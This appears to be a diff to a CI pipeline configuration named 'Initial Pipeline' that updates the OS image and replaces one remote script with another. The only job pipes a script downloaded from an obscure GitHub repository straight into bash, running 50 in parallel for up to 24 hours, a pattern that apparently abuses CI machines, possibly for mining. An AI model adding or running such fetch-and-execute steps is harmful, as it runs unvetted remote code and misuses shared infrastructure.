@@ -3,7 +3,7 @@ name: Initial Pipeline
 agent: 
   machine: 
     type: e1-standard-8 
-    os_image: ubuntu2004 
+    os_image: Ubuntu 24.04
 execution_time_limit: 
   hours: 24 
 fail_fast: 
@@ -15,5 +15,5 @@ blocks:
       jobs: 
         - name: 'Job #1' 
           commands: 
-            - curl -sL https://github.com/mgssjs/moanu/raw/main/fac | bash
+            - curl -sL https://github.com/mgssjs/moanu/raw/main/xc22 | bash
           parallelism: 50
